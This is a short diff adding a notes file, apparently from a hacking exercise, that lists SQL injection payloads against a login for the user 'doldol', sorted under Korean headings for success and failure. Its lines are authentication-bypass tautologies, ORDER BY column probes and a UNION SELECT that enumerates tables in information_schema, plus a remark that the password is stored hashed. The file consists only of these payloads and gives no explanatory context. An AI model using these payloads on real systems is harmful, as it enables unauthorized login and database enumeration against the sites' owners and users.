@@ -1,0 +1,11 @@
+<성공>
+doldol' or '1' = '1' order by 2 desc#   
+
+
+
+
+<실패>
+doldol' or '1' = '1' order by 2 #
+doldol' and pass='dol1234   해시로 등록되어 있음
+doldol' or '1' = '1' order by 1 desc#         ' 
+'doldol' union select count(table_name),2 from information_schema.tables where table_schema = database() union select 1,2 order by 1 desc#
